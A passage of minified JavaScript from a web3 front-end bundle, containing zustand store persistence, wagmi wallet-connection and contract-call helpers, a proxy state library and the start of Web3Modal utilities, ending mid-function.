o.persist={setOptions:v=>{i={...i,...v},v.storage&&(l=v.storage)},clearStorage:()=>{l==null||l.removeItem(i.name)},getOptions:()=>i,rehydrate:()=>w(),hasHydrated:()=>a,onHydrate:v=>(s.add(v),()=>{s.delete(v)}),onFinishHydration:v=>(c.add(v),()=>{c.delete(v)})},i.skipHydration||w(),g||m},n2=(t,e)=>"getStorage"in e||"serialize"in e||"deserialize"in e?((Yb?"production":void 0)!=="production"&&console.warn("[DEPRECATED] `getStorage`, `serialize` and `deserialize` options are deprecated. Use `storage` option instead."),e2(t,e)):t2(t,e),r2=n2;var i2={BASE_URL:"/",MODE:"production",DEV:!1,PROD:!0,SSR:!1};const Uf=t=>{let e;const n=new Set,r=(c,l)=>{const u=typeof c=="function"?c(e):c;if(!Object.is(u,e)){const p=e;e=l??typeof u!="object"?u:Object.assign({},e,u),n.forEach(m=>m(e,p))}},o=()=>e,s={setState:r,getState:o,subscribe:c=>(n.add(c),()=>n.delete(c)),destroy:()=>{(i2?"production":void 0)!=="production"&&console.warn("[DEPRECATED] The `destroy` method will be unsupported in a future version. Instead use unsubscribe function returned by subscribe. Everything will be garbage-collected if store is garbage-collected."),n.clear()}};return e=t(r,o,s),s},o2=t=>t?Uf(t):Uf;function up(t,e){if(Object.is(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;if(t instanceof Map&&e instanceof Map){if(t.size!==e.size)return!1;for(const[r,o]of t)if(!Object.is(o,e.get(r)))return!1;return!0}if(t instanceof Set&&e instanceof Set){if(t.size!==e.size)return!1;for(const r of t)if(!e.has(r))return!1;return!0}const n=Object.keys(t);if(n.length!==Object.keys(e).length)return!1;for(let r=0;r<n.length;r++)if(!Object.prototype.hasOwnProperty.call(e,n[r])||!Object.is(t[n[r]],e[n[r]]))return!1;return!0}function dp(t,e,{batch:n={multicall:{wait:32}},pollingInterval:r=4e3,rank:o,retryCount:i,retryDelay:a,stallTimeout:s}={}){if(!t.length)throw new Error("must have at least one chain");let c=[];const l={},u={};for(const p of t){let m=!1;for(const g of e){const w=g(p);w&&(m=!0,c.some(({id:v})=>v===p.id)||(c=[...c,w.chain]),l[p.id]=[...l[p.id]||[],...w.rpcUrls.http],w.rpcUrls.webSocket&&(u[p.id]=[...u[p.id]||[],...w.rpcUrls.webSocket]))}if(!m)throw new Error([`Could not find valid provider configuration for chain "${p.name}".
`,"You may need to add `jsonRpcProvider` to `configureChains` with the chain's RPC URLs.","Read more: https://wagmi.sh/core/providers/jsonRpc"].join(`
`))}return{chains:c,publicClient:({chainId:p})=>{const m=c.find(v=>v.id===p)??t[0],g=l[m.id];if(!g||!g[0])throw new Error(`No providers configured for chain "${m.id}"`);const w=Mf({batch:n,chain:m,transport:Rf(g.map(v=>Uw(v,{timeout:s})),{rank:o,retryCount:i,retryDelay:a}),pollingInterval:r});return Object.assign(w,{chains:c})},webSocketPublicClient:({chainId:p})=>{const m=c.find(v=>v.id===p)??t[0],g=u[m.id];if(!g||!g[0])return;const w=Mf({batch:n,chain:m,transport:Rf(g.map(v=>Hb(v,{timeout:s})),{rank:o,retryCount:i,retryDelay:a}),pollingInterval:r});return Object.assign(w,{chains:c})}}}var a2=class extends Error{constructor({activeChain:t,targetChain:e}){super(`Chain mismatch: Expected "${e}", received "${t}".`),this.name="ChainMismatchError"}},s2=class extends Error{constructor({chainId:t,connectorId:e}){super(`Chain "${t}" not configured${e?` for connector "${e}"`:""}.`),this.name="ChainNotConfigured"}},c2=class extends Error{constructor(){super(...arguments),this.name="ConnectorAlreadyConnectedError",this.message="Connector already connected"}},l2=class extends Error{constructor(){super(...arguments),this.name="ConfigChainsNotFound",this.message="No chains were found on the wagmi config. Some functions that require a chain may not work."}},u2=class extends Error{constructor({connector:t}){super(`"${t.name}" does not support programmatic chain switching.`),this.name="SwitchChainNotSupportedError"}},uu=(t,{find:e,replace:n})=>t&&e(t)?n(t):typeof t!="object"?t:Array.isArray(t)?t.map(r=>uu(r,{find:e,replace:n})):t instanceof Object?Object.entries(t).reduce((r,[o,i])=>({...r,[o]:uu(i,{find:e,replace:n})}),{}):t;function d2(t){const e=JSON.parse(t);return uu(e,{find:r=>typeof r=="string"&&r.startsWith("#bigint."),replace:r=>BigInt(r.replace("#bigint.",""))})}function f2(t){return{accessList:t.accessList,account:t.account,blockNumber:t.blockNumber,blockTag:t.blockTag,data:t.data,gas:t.gas,gasPrice:t.gasPrice,maxFeePerGas:t.maxFeePerGas,maxPriorityFeePerGas:t.maxPriorityFeePerGas,nonce:t.nonce,to:t.to,value:t.value}}function Bf(t){return typeof t=="number"?t:t==="wei"?0:Math.abs(Dm[t])}function Lf(t,e){return t.slice(0,e).join(".")||"."}function jf(t,e){const{length:n}=t;for(let r=0;r<n;++r)if(t[r]===e)return r+1;return 0}function h2(t,e){const n=typeof t=="function",r=typeof e=="function",o=[],i=[];return function(s,c){if(typeof c=="object")if(o.length){const l=jf(o,this);l===0?o[o.length]=this:(o.splice(l),i.splice(l)),i[i.length]=s;const u=jf(o,c);if(u!==0)return r?e.call(this,s,c,Lf(i,u)):`[ref=${Lf(i,u)}]`}else o[0]=c,i[0]=s;return n?t.call(this,s,c):c}}function p2(t,e,n,r){return JSON.stringify(t,h2((o,i)=>{const a=typeof i=="bigint"?`#bigint.${i.toString()}`:i;return(e==null?void 0:e(o,a))||a},r),n??void 0)}var m2={getItem:t=>"",setItem:(t,e)=>null,removeItem:t=>null};function g2({deserialize:t=d2,key:e="wagmi",serialize:n=p2,storage:r}){return{...r,getItem:(o,i=null)=>{const a=r.getItem(`${e}.${o}`);try{return a?t(a):i}catch(s){return console.warn(s),i}},setItem:(o,i)=>{if(i===null)r.removeItem(`${e}.${o}`);else try{r.setItem(`${e}.${o}`,n(i))}catch(a){console.error(a)}},removeItem:o=>r.removeItem(`${e}.${o}`)}}var Ff="store",_i,Eo,du,fp,w2=class{constructor({autoConnect:t=!1,connectors:e=[new Sd],publicClient:n,storage:r=g2({storage:typeof window<"u"?window.localStorage:m2}),logger:o={warn:console.warn},webSocketPublicClient:i}){var l,u;wl(this,du),this.publicClients=new Map,this.webSocketPublicClients=new Map,wl(this,_i,void 0),wl(this,Eo,void 0),this.args={autoConnect:t,connectors:e,logger:o,publicClient:n,storage:r,webSocketPublicClient:i};let a="disconnected",s;if(t)try{const p=r.getItem(Ff),m=(l=p==null?void 0:p.state)==null?void 0:l.data;a=m!=null&&m.account?"reconnecting":"connecting",s=(u=m==null?void 0:m.chain)==null?void 0:u.id}catch{}const c=typeof e=="function"?e():e;c.forEach(p=>p.setStorage(r)),this.store=o2(Xb(r2(()=>({connectors:c,publicClient:this.getPublicClient({chainId:s}),status:a,webSocketPublicClient:this.getWebSocketPublicClient({chainId:s})}),{name:Ff,storage:r,partialize:p=>{var m,g;return{...t&&{data:{account:(m=p==null?void 0:p.data)==null?void 0:m.account,chain:(g=p==null?void 0:p.data)==null?void 0:g.chain}},chains:p==null?void 0:p.chains}},version:2}))),this.storage=r,ss(this,Eo,r==null?void 0:r.getItem("wallet")),Kb(this,du,fp).call(this),t&&typeof window<"u"&&setTimeout(async()=>await this.autoConnect(),0)}get chains(){return this.store.getState().chains}get connectors(){return this.store.getState().connectors}get connector(){return this.store.getState().connector}get data(){return this.store.getState().data}get error(){return this.store.getState().error}get lastUsedChainId(){var t,e;return(e=(t=this.data)==null?void 0:t.chain)==null?void 0:e.id}get publicClient(){return this.store.getState().publicClient}get status(){return this.store.getState().status}get subscribe(){return this.store.subscribe}get webSocketPublicClient(){return this.store.getState().webSocketPublicClient}setState(t){const e=typeof t=="function"?t(this.store.getState()):t;this.store.setState(e,!0)}clearState(){this.setState(t=>({...t,chains:void 0,connector:void 0,data:void 0,error:void 0,status:"disconnected"}))}async destroy(){var t,e;this.connector&&await((e=(t=this.connector).disconnect)==null?void 0:e.call(t)),ss(this,_i,!1),this.clearState(),this.store.destroy()}async autoConnect(){if(gl(this,_i))return;ss(this,_i,!0),this.setState(n=>{var r;return{...n,status:(r=n.data)!=null&&r.account?"reconnecting":"connecting"}});const t=gl(this,Eo)?[...this.connectors].sort(n=>n.id===gl(this,Eo)?-1:1):this.connectors;let e=!1;for(const n of t){if(!n.ready||!n.isAuthorized||!await n.isAuthorized())continue;const o=await n.connect();this.setState(i=>({...i,connector:n,chains:n==null?void 0:n.chains,data:o,status:"connected"})),e=!0;break}return e||this.setState(n=>({...n,data:void 0,status:"disconnected"})),ss(this,_i,!1),this.data}setConnectors(t){this.args={...this.args,connectors:t};const e=typeof t=="function"?t():t;e.forEach(n=>n.setStorage(this.args.storage)),this.setState(n=>({...n,connectors:e}))}getPublicClient({chainId:t}={}){let e=this.publicClients.get(-1);if(e&&(e==null?void 0:e.chain.id)===t||(e=this.publicClients.get(t??-1),e))return e;const{publicClient:n}=this.args;return e=typeof n=="function"?n({chainId:t}):n,this.publicClients.set(t??-1,e),e}setPublicClient(t){var n,r;const e=(r=(n=this.data)==null?void 0:n.chain)==null?void 0:r.id;this.args={...this.args,publicClient:t},this.publicClients.clear(),this.setState(o=>({...o,publicClient:this.getPublicClient({chainId:e})}))}getWebSocketPublicClient({chainId:t}={}){let e=this.webSocketPublicClients.get(-1);if(e&&(e==null?void 0:e.chain.id)===t||(e=this.webSocketPublicClients.get(t??-1),e))return e;const{webSocketPublicClient:n}=this.args;return e=typeof n=="function"?n({chainId:t}):n,e&&this.webSocketPublicClients.set(t??-1,e),e}setWebSocketPublicClient(t){var n,r;const e=(r=(n=this.data)==null?void 0:n.chain)==null?void 0:r.id;this.args={...this.args,webSocketPublicClient:t},this.webSocketPublicClients.clear(),this.setState(o=>({...o,webSocketPublicClient:this.getWebSocketPublicClient({chainId:e})}))}setLastUsedConnector(t=null){var e;(e=this.storage)==null||e.setItem("wallet",t)}};_i=new WeakMap;Eo=new WeakMap;du=new WeakSet;fp=function(){const t=s=>{this.setState(c=>({...c,data:{...c.data,...s}}))},e=()=>{this.clearState()},n=s=>{this.setState(c=>({...c,error:s}))};this.store.subscribe(({connector:s})=>s,(s,c)=>{var l,u,p,m,g,w;(l=c==null?void 0:c.off)==null||l.call(c,"change",t),(u=c==null?void 0:c.off)==null||u.call(c,"disconnect",e),(p=c==null?void 0:c.off)==null||p.call(c,"error",n),s&&((m=s.on)==null||m.call(s,"change",t),(g=s.on)==null||g.call(s,"disconnect",e),(w=s.on)==null||w.call(s,"error",n))});const{publicClient:r,webSocketPublicClient:o}=this.args;(typeof r=="function"||typeof o=="function")&&this.store.subscribe(({data:s})=>{var c;return(c=s==null?void 0:s.chain)==null?void 0:c.id},s=>{this.setState(c=>({...c,publicClient:this.getPublicClient({chainId:s}),webSocketPublicClient:this.getWebSocketPublicClient({chainId:s})}))})};var fu;function b2(t){const e=new w2(t);return fu=e,e}function Pn(){if(!fu)throw new Error("No wagmi config found. Ensure you have set up a config: https://wagmi.sh/react/config");return fu}async function Wf({chainId:t,connector:e}){const n=Pn(),r=n.connector;if(r&&e.id===r.id)throw new c2;try{n.setState(i=>({...i,status:"connecting"}));const o=await e.connect({chainId:t});return n.setLastUsedConnector(e.id),n.setState(i=>({...i,connector:e,chains:e==null?void 0:e.chains,data:o,status:"connected"})),n.storage.setItem("connected",!0),{...o,connector:e}}catch(o){throw n.setState(i=>({...i,status:i.connector?"connected":"disconnected"})),o}}async function hp(){const t=Pn();t.connector&&await t.connector.disconnect(),t.clearState(),t.storage.removeItem("connected")}var y2=[{type:"event",name:"Approval",inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"event",name:"Transfer",inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"function",name:"allowance",stateMutability:"view",inputs:[{name:"owner",type:"address"},{name:"spender",type:"address"}],outputs:[{name:"",type:"uint256"}]},{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"balanceOf",stateMutability:"view",inputs:[{name:"account",type:"address"}],outputs:[{name:"",type:"uint256"}]},{type:"function",name:"decimals",stateMutability:"view",inputs:[],outputs:[{name:"",type:"uint8"}]},{type:"function",name:"name",stateMutability:"view",inputs:[],outputs:[{name:"",type:"string"}]},{type:"function",name:"symbol",stateMutability:"view",inputs:[],outputs:[{name:"",type:"string"}]},{type:"function",name:"totalSupply",stateMutability:"view",inputs:[],outputs:[{name:"",type:"uint256"}]},{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],v2=[{type:"event",name:"Approval",inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"event",name:"Transfer",inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"function",name:"allowance",stateMutability:"view",inputs:[{name:"owner",type:"address"},{name:"spender",type:"address"}],outputs:[{name:"",type:"uint256"}]},{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"balanceOf",stateMutability:"view",inputs:[{name:"account",type:"address"}],outputs:[{name:"",type:"uint256"}]},{type:"function",name:"decimals",stateMutability:"view",inputs:[],outputs:[{name:"",type:"uint8"}]},{type:"function",name:"name",stateMutability:"view",inputs:[],outputs:[{name:"",type:"bytes32"}]},{type:"function",name:"symbol",stateMutability:"view",inputs:[],outputs:[{name:"",type:"bytes32"}]},{type:"function",name:"totalSupply",stateMutability:"view",inputs:[],outputs:[{name:"",type:"uint256"}]},{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]}];function ui({chainId:t}={}){const e=Pn();return t&&e.getPublicClient({chainId:t})||e.publicClient}async function Td({chainId:t}={}){var r,o;return await((o=(r=Pn().connector)==null?void 0:r.getWalletClient)==null?void 0:o.call(r,{chainId:t}))||null}async function x2({abi:t,address:e,args:n,chainId:r,dataSuffix:o,functionName:i,walletClient:a,...s}){const c=ui({chainId:r}),l=a??await Td({chainId:r});if(!l)throw new vn;r&&mp({chainId:r});const{account:u,accessList:p,blockNumber:m,blockTag:g,gas:w,gasPrice:v,maxFeePerGas:E,maxPriorityFeePerGas:I,nonce:b,value:_}=f2(s),{result:x,request:C}=await c.simulateContract({abi:t,address:e,functionName:i,args:n,account:u||l.account,accessList:p,blockNumber:m,blockTag:g,dataSuffix:o,gas:w,gasPrice:v,maxFeePerGas:E,maxPriorityFeePerGas:I,nonce:b,value:_}),A=t.filter(f=>"name"in f&&f.name===i);return{mode:"prepared",request:{...C,abi:A,chainId:r},result:x}}async function _2({chainId:t,contracts:e,blockNumber:n,blockTag:r,...o}){const i=ui({chainId:t});if(!i.chains)throw new l2;if(t&&i.chain.id!==t)throw new s2({chainId:t});return i.multicall({allowFailure:o.allowFailure??!0,blockNumber:n,blockTag:r,contracts:e})}async function E2({address:t,account:e,chainId:n,abi:r,args:o,functionName:i,blockNumber:a,blockTag:s}){return ui({chainId:n}).readContract({abi:r,address:t,account:e,functionName:i,args:o,blockNumber:a,blockTag:s})}async function C2({contracts:t,blockNumber:e,blockTag:n,...r}){const{allowFailure:o=!0}=r;try{const i=ui(),a=t.reduce((u,p,m)=>{const g=p.chainId??i.chain.id;return{...u,[g]:[...u[g]||[],{contract:p,index:m}]}},{}),s=()=>Object.entries(a).map(([u,p])=>_2({allowFailure:o,chainId:parseInt(u),contracts:p.map(({contract:m})=>m),blockNumber:e,blockTag:n})),c=(await Promise.all(s())).flat(),l=Object.values(a).flatMap(u=>u.map(({index:p})=>p));return c.reduce((u,p,m)=>(u&&(u[l[m]]=p),u),[])}catch(i){if(i instanceof sd)throw i;const a=()=>t.map(s=>E2({...s,blockNumber:e,blockTag:n}));return o?(await Promise.allSettled(a())).map(s=>s.status==="fulfilled"?{result:s.value,status:"success"}:{error:s.reason,result:void 0,status:"failure"}):await Promise.all(a())}}async function S2(t){const e=await Td({chainId:t.chainId});if(!e)throw new vn;t.chainId&&mp({chainId:t.chainId});let n;if(t.mode==="prepared")n=t.request;else{const{chainId:o,mode:i,...a}=t;n=(await x2(a)).request}return{hash:await e.writeContract({...n,chain:t.chainId?{id:t.chainId}:null})}}async function A2({address:t,chainId:e,formatUnits:n,token:r}){const o=Pn(),i=ui({chainId:e});if(r){const l=async({abi:u})=>{const p={abi:u,address:r,chainId:e},[m,g,w]=await C2({allowFailure:!1,contracts:[{...p,functionName:"balanceOf",args:[t]},{...p,functionName:"decimals"},{...p,functionName:"symbol"}]});return{decimals:g,formatted:_s(m??"0",Bf(n??g)),symbol:w,value:m}};try{return await l({abi:y2})}catch(u){if(u instanceof sd){const{symbol:p,...m}=await l({abi:v2});return{symbol:hh(jr(p,{dir:"right"})),...m}}throw u}}const a=[...o.publicClient.chains||[],...o.chains??[]],s=await i.getBalance({address:t}),c=a.find(l=>l.id===i.chain.id);return{decimals:(c==null?void 0:c.nativeCurrency.decimals)??18,formatted:_s(s??"0",Bf(n??18)),symbol:(c==null?void 0:c.nativeCurrency.symbol)??"ETH",value:s}}function Os(){const{data:t,connector:e,status:n}=Pn();switch(n){case"connected":return{address:t==null?void 0:t.account,connector:e,isConnected:!0,isConnecting:!1,isDisconnected:!1,isReconnecting:!1,status:n};case"reconnecting":return{address:t==null?void 0:t.account,connector:e,isConnected:!!(t!=null&&t.account),isConnecting:!1,isDisconnected:!1,isReconnecting:!0,status:n};case"connecting":return{address:t==null?void 0:t.account,connector:e,isConnected:!1,isConnecting:!0,isDisconnected:!1,isReconnecting:!1,status:n};case"disconnected":return{address:void 0,connector:void 0,isConnected:!1,isConnecting:!1,isDisconnected:!0,isReconnecting:!1,status:n}}}function Qo(){var o,i,a,s;const t=Pn(),e=(i=(o=t.data)==null?void 0:o.chain)==null?void 0:i.id,n=t.chains??[],r=[...((a=t.publicClient)==null?void 0:a.chains)||[],...n].find(c=>c.id===e)??{id:e,name:`Chain ${e}`,network:`${e}`,nativeCurrency:{name:"Ether",decimals:18,symbol:"ETH"},rpcUrls:{default:{http:[""]},public:{http:[""]}}};return{chain:e?{...r,...(s=t.data)==null?void 0:s.chain,id:e}:void 0,chains:n}}async function T2(t){const e=await Td();if(!e)throw new vn;return await e.signMessage({message:t.message})}async function Id({chainId:t}){const{connector:e}=Pn();if(!e)throw new vn;if(!e.switchChain)throw new u2({connector:e});return e.switchChain(t)}function pp(t,{selector:e=n=>n}={}){const n=Pn(),r=()=>t(Os());return n.subscribe(({data:i,connector:a,status:s})=>e({address:i==null?void 0:i.account,connector:a,status:s}),r,{equalityFn:up})}function I2(t,{selector:e=n=>n}={}){const n=Pn(),r=()=>t(Qo());return n.subscribe(({data:i,chains:a})=>{var s;return e({chainId:(s=i==null?void 0:i.chain)==null?void 0:s.id,chains:a})},r,{equalityFn:up})}async function $2({name:t,chainId:e}){const{normalize:n}=await ki(()=>import("./index-9CQQlerO.js"),__vite__mapDeps([]));return await ui({chainId:e}).getEnsAvatar({name:n(t)})}async function O2({address:t,chainId:e}){return ui({chainId:e}).getEnsName({address:Vt(t)})}function mp({chainId:t}){var o,i;const{chain:e,chains:n}=Qo(),r=e==null?void 0:e.id;if(r&&t!==r)throw new a2({activeChain:((o=n.find(a=>a.id===r))==null?void 0:o.name)??`Chain ${r}`,targetChain:((i=n.find(a=>a.id===t))==null?void 0:i.name)??`Chain ${t}`})}const P2=Symbol(),zf=Object.getPrototypeOf,hu=new WeakMap,D2=t=>t&&(hu.has(t)?hu.get(t):zf(t)===Object.prototype||zf(t)===Array.prototype),R2=t=>D2(t)&&t[P2]||null,Hf=(t,e=!0)=>{hu.set(t,e)};var Ps={BASE_URL:"/",MODE:"production",DEV:!1,PROD:!0,SSR:!1};const bl=t=>typeof t=="object"&&t!==null,er=new WeakMap,Co=new WeakSet,N2=(t=Object.is,e=(l,u)=>new Proxy(l,u),n=l=>bl(l)&&!Co.has(l)&&(Array.isArray(l)||!(Symbol.iterator in l))&&!(l instanceof WeakMap)&&!(l instanceof WeakSet)&&!(l instanceof Error)&&!(l instanceof Number)&&!(l instanceof Date)&&!(l instanceof String)&&!(l instanceof RegExp)&&!(l instanceof ArrayBuffer),r=l=>{switch(l.status){case"fulfilled":return l.value;case"rejected":throw l.reason;default:throw l}},o=new WeakMap,i=(l,u,p=r)=>{const m=o.get(l);if((m==null?void 0:m[0])===u)return m[1];const g=Array.isArray(l)?[]:Object.create(Object.getPrototypeOf(l));return Hf(g,!0),o.set(l,[u,g]),Reflect.ownKeys(l).forEach(w=>{if(Object.getOwnPropertyDescriptor(g,w))return;const v=Reflect.get(l,w),E={value:v,enumerable:!0,configurable:!0};if(Co.has(v))Hf(v,!1);else if(v instanceof Promise)delete E.value,E.get=()=>p(v);else if(er.has(v)){const[I,b]=er.get(v);E.value=i(I,b(),p)}Object.defineProperty(g,w,E)}),Object.preventExtensions(g)},a=new WeakMap,s=[1,1],c=l=>{if(!bl(l))throw new Error("object required");const u=a.get(l);if(u)return u;let p=s[0];const m=new Set,g=(R,N=++s[0])=>{p!==N&&(p=N,m.forEach(k=>k(R,N)))};let w=s[1];const v=(R=++s[1])=>(w!==R&&!m.size&&(w=R,I.forEach(([N])=>{const k=N[1](R);k>p&&(p=k)})),p),E=R=>(N,k)=>{const Y=[...N];Y[1]=[R,...Y[1]],g(Y,k)},I=new Map,b=(R,N)=>{if((Ps?"production":void 0)!=="production"&&I.has(R))throw new Error("prop listener already exists");if(m.size){const k=N[3](E(R));I.set(R,[N,k])}else I.set(R,[N])},_=R=>{var N;const k=I.get(R);k&&(I.delete(R),(N=k[1])==null||N.call(k))},x=R=>(m.add(R),m.size===1&&I.forEach(([k,Y],re)=>{if((Ps?"production":void 0)!=="production"&&Y)throw new Error("remove already exists");const W=k[3](E(re));I.set(re,[k,W])}),()=>{m.delete(R),m.size===0&&I.forEach(([k,Y],re)=>{Y&&(Y(),I.set(re,[k]))})}),C=Array.isArray(l)?[]:Object.create(Object.getPrototypeOf(l)),f=e(C,{deleteProperty(R,N){const k=Reflect.get(R,N);_(N);const Y=Reflect.deleteProperty(R,N);return Y&&g(["delete",[N],k]),Y},set(R,N,k,Y){const re=Reflect.has(R,N),W=Reflect.get(R,N,Y);if(re&&(t(W,k)||a.has(k)&&t(W,a.get(k))))return!0;_(N),bl(k)&&(k=R2(k)||k);let L=k;if(k instanceof Promise)k.then(U=>{k.status="fulfilled",k.value=U,g(["resolve",[N],U])}).catch(U=>{k.status="rejected",k.reason=U,g(["reject",[N],U])});else{!er.has(k)&&n(k)&&(L=c(k));const U=!Co.has(L)&&er.get(L);U&&b(N,U)}return Reflect.set(R,N,L,Y),g(["set",[N],k,W]),!0}});a.set(l,f);const T=[C,v,i,x];return er.set(f,T),Reflect.ownKeys(l).forEach(R=>{const N=Object.getOwnPropertyDescriptor(l,R);"value"in N&&(f[R]=l[R],delete N.value,delete N.writable),Object.defineProperty(C,R,N)}),f})=>[c,er,Co,t,e,n,r,o,i,a,s],[k2]=N2();function At(t={}){return k2(t)}function Gn(t,e,n){const r=er.get(t);(Ps?"production":void 0)!=="production"&&!r&&console.warn("Please use proxy object");let o;const i=[],a=r[3];let s=!1;const l=a(u=>{if(i.push(u),n){e(i.splice(0));return}o||(o=Promise.resolve().then(()=>{o=void 0,s&&e(i.splice(0))}))});return s=!0,()=>{s=!1,l()}}function M2(t,e){const n=er.get(t);(Ps?"production":void 0)!=="production"&&!n&&console.warn("Please use proxy object");const[r,o,i]=n;return i(r,o(),e)}function ea(t){return Co.add(t),t}function hn(t,e,n,r){let o=t[e];return Gn(t,()=>{const i=t[e];Object.is(o,i)||n(o=i)},r)}const yl="https://secure.web3modal.com",Bn={FOUR_MINUTES_MS:24e4,TEN_SEC_MS:1e4,ONE_SEC_MS:1e3,SECURE_SITE:yl,SECURE_SITE_DASHBOARD:`${yl}/dashboard`,SECURE_SITE_FAVICON:`${yl}/images/favicon.png`,RESTRICTED_TIMEZONES:["ASIA/SHANGHAI","ASIA/URUMQI","ASIA/CHONGQING","ASIA/HARBIN","ASIA/KASHGAR","ASIA/MACAU","ASIA/HONG_KONG","ASIA/MACAO","ASIA/BEIJING","ASIA/HARBIN"],CONNECTOR_RDNS_MAP:{coinbaseWallet:"com.coinbase.wallet"}},le={isMobile(){return typeof window<"u"?!!(window.matchMedia("(pointer:coarse)").matches||/Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)):!1},isAndroid(){const t=window.navigator.userAgent.toLowerCase();return le.isMobile()&&t.includes("android")},isIos(){const t=window.navigator.userAgent.toLowerCase();return le.isMobile()&&(t.includes("iphone")||t.includes("ipad"))},isClient(){return typeof window<"u"},isPairingExpired(t){return t?t-Date.now()<=Bn.TEN_SEC_MS:!0},isAllowedRetry(t){return Date.now()-t>=Bn.ONE_SEC_MS},copyToClopboard(t){navigator.clipboard.writeText(t)},getPairingExpiry(){return Date.now()+Bn.FOUR_MINUTES_MS},getPlainAddress(t){return t.split(":")[2]},async wait(t){return new Promise(e=>{setTimeout(e,t)})},debounce(t,e=500){let n;return(...r)=>{function o(){t(...r)}n&&clearTimeout(n),n=setTimeout(o,e)}},isHttpUrl(t){return t.startsWith("http://")||t.startsWith("https://")},formatNativeUrl(t,e){if(le.isHttpUrl(t))return this.formatUniversalUrl(t,e);let n=t;n.includes("://")||(n=t.replaceAll("/","").replaceAll(":",""),n=`${n}://`),n.endsWith("/")||(n=`${n}/`);const r=encodeURIComponent(e);return{redirect:`${n}wc?uri=${r}`,href:n}},formatUniversalUrl(t,e){if(!le.isHttpUrl(t))return this.formatNativeUrl(t,e);let n=t;n.endsWith("/")||(n=`${n}/`);const r=encodeURIComponent(e);return{redirect:`${n}wc?uri=${r}`,href:n}},openHref(t,e){window.open(t,e,"noreferrer noopener")},async preloadImage(t){const e=new Promise((n,r)=>{const o=new Image;o.onload=n,o.onerror=r,o.crossOrigin="anonymous",o.src=t});return Promise.race([e,le.wait(2e3)])},formatBalance(t,e){var r;let n;if(t==="0")n="0.000";else if(typeof t=="string"){const o=Number(t);o&&(n=(r=o.toString().match(/^-?\d+(?:\.\d{0,3})?/u))==null?void 0:r[0])}return n?`${n} ${e}`:`0.000 ${e}`},isRestrictedRegion(){try{const{timeZone:t}=new Intl.DateTimeFormat().resolvedOptions(),e=t.toUpperCase();return Bn.RESTRICTED_TIMEZONES.includes(e)}catch{return!1}},getApiUrl(){return le.isRestrictedRegion()?"https://api.web3modal.org":"https://api.web3modal.com"},getBlockchainApiUrl(){return le.isRestrictedRegion()?"https://rpc.walletconnect.org":"https://rpc.walletconnect.com"},getAnalyticsUrl(){return le.isRestrictedRegion()?"https://pulse.walletconnect.org":"https://pulse.walletconnect.com"},getUUID(){return crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})},parseError(t){var e,n;return typeof t=="string"?t:typeof((n=(e=t==null?void 0:t.issues)==null?void 0:e[0])==null?void 0:n.message)=="string"?t.issues[0].message:t instanceof Error?t.message:"Unknown error"}},ot=At({isConnected:!1}),ke={state:ot,subscribe(t){return Gn(ot,()=>t(ot))},subscribeKey(t,e){return hn(ot,t,e)},setIsConnected(t){ot.isConnected=t},setCaipAddress(t){ot.caipAddress=t,ot.address=t?le.getPlainAddress(t):void 0},setBalance(t,e){ot.balance=t,ot.balanceSymbol=e},setProfileName(t){ot.profileName=t},setProfileImage(t){ot.profileImage=t},setAddressExplorerUrl(t){ot.addressExplorerUrl=t},resetAccount(){ot.isConnected=!1,ot.caipAddress=void 0,ot.address=void 0,ot.balance=void 0,ot.balanceSymbol=void 0,ot.profileName=void 0,ot.profileImage=void 0,ot.addressExplorerUrl=void 0}};class $d{constructor({baseUrl:e}){this.baseUrl=e}async get({headers:e,...n}){const r=this.createUrl(n);return(await fetch(r,{method:"GET",headers:e})).json()}async getBlob({headers:e,...n}){const r=this.createUrl(n);return(await fetch(r,{method:"GET",headers:e})).blob()}async post({body:e,headers:n,...r}){const o=this.createUrl(r);return(await fetch(o,{method:"POST",headers:n,body:e?JSON.stringify(e):void 0})).json()}async put({body:e,headers:n,...r}){const o=this.createUrl(r);return(await fetch(o,{method:"PUT",headers:n,body:e?JSON.stringify(e):void 0})).json()}async delete({body:e,headers:n,...r}){const o=this.createUrl(r);return(await fetch(o,{method:"DELETE",headers:n,body:e?JSON.stringify(e):void 0})).json()}createUrl({path:e,params:n}){const r=new URL(e,this.baseUrl);return n&&Object.entries(n).forEach(([o,i])=>{i&&r.searchParams.append(o,i)}),r}}const vl="WALLETCONNECT_DEEPLINK_CHOICE",Vf="@w3m/recent",Zf="@w3m/connected_wallet_image_url",Gf="@w3m/connected_connector",_t={setWalletConnectDeepLink({href:t,name:e}){try{localStorage.setItem(vl,JSON.stringify({href:t,name:e}))}catch{console.info("Unable to set WalletConnect deep link")}},getWalletConnectDeepLink(){try{const 